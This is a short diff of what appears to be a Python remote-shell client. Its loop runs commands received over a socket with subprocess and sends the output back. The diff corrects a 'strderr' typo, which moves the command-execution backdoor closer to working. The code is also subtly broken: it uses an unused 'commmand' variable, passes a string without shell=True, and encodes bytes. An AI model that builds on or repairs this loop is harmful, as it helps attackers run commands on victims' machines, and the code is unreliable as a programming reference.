@@ -25,7 +25,7 @@ def main():
         commmand = command.split(" ")
          # EXDCUTING COMMAND
         # getoutput returns output stdout and stderr of executing cmd in a shell
-        output = subprocess.check_output(command, strderr=subprocess.STDOUT)
+        output = subprocess.check_output(command, stderr=subprocess.STDOUT)
         client.send(output.encode())
         
     client.close()
